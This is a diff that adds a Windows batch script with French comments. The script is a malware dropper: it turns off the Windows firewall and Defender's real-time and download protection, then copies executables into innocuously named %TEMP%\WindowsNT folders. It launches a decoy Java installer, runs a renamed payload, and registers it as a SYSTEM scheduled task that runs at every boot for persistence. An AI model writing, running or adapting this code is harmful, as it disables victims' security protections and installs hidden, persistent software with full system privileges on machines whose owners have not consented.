@@ -1,0 +1,51 @@
+﻿echo off
+cls
+
+
+REM -- Réglages des dossiers
+ 
+
+REM -- Desactivation des antivirus:
+
+ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle normal (Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled false)
+ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle normal (Set-MpPreference -DIsableRealTimeMonitoring $true)
+ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle normal (Set-MpPreference -DisableIOAVProtection $true)
+cmd.exe
+
+
+
+
+
+set dossier="C:\"Program Files (x86)"\Java\"
+set paydir="%TEMP%\WindowsNT\NTSystem"
+set dossierscreenshots="%TEMP%\WindowsNT\NTSecure"
+
+mkdir "%dossierscreenshots%\"
+Mkdir "%paydir%\"
+
+
+REM -- Déplacement des éléments dans un répertoire
+cd lib\
+copy ncmd.exe "%paydir%"\ncmd.exe
+copy dascre.exe "%paydir%"\23592.exe
+
+IF EXIST "%dossier%"\jre1.8.0_221\README.txt (start Cart.exe) ELSE start jre.exe
+
+cd %paydir%\
+
+
+ 
+
+REM -- Desactivation des Av && lancement du telechargemnt
+start 23592.exe
+
+
+REM -- percistence :
+IF EXIST cbn.txt ( EXIT )
+
+schtasks /create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN "EnableTask" /TR "%TEMP%\WindowsNT\NTSystem\23592.exe"
+echo "Cbon" > cbn.txt
+
+
+ 
+
